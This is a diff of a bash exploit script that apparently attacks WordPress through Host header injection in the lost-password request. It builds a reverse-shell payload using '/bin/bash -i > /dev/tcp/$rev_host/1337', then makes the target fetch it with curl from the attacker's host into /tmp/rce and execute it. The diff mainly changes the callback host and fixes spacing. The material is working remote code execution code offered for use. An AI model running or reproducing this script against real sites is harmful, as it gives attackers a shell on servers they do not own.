@@ -65,14 +65,14 @@ if [ "$choice" == "y" ]; then
 echo -e "\e[92m[*]\033[0m Guess I can't argue with that... Let's get started...\n"
 echo -e "\e[92m[+]\033[0m Connected to the target"
 # Serve payload/bash script on :80
-RCE_exec_cmd="(sleep 3s && /bin/bash -i > /dev/tcp/$target/1337 0<&1 2>&1)"
+RCE_exec_cmd="(sleep 3s && /bin/bash -i > /dev/tcp/$rev_host/1337 0<&1 2>&1)"
 echo "$RCE_exec_cmd" > rce.txt
-# python -m SimpleHTTPServer 80 2>/dev/null >&2 &
+# python -mSimpleHTTPServer 80 2>/dev/null >&2 &
 # hpid=$!
 # Save payload on the target in /tmp/rce
 cmd="/usr/bin/curl -o /tmp/rce $rev_host/rce.txt"
 prep_host_header "$cmd"
-curl -H"Host: $host_header" -s -d 'user_login=admin&wp-submit=Get+New+Password' $target/wordpress/wp-login.php?action=lostpassword
+curl -H "Host: $host_header" -s -d 'user_login=admin&wp-submit=Get+New+Password' $target/wordpress/wp-login.php?action=lostpassword
 echo -e "\n\e[92m[+]\e[0m Payload sent successfully"
 # Execute payload (RCE_exec_cmd) on the target /bin/bash /tmp/rce
 cmd="/bin/bash /tmp/rce"
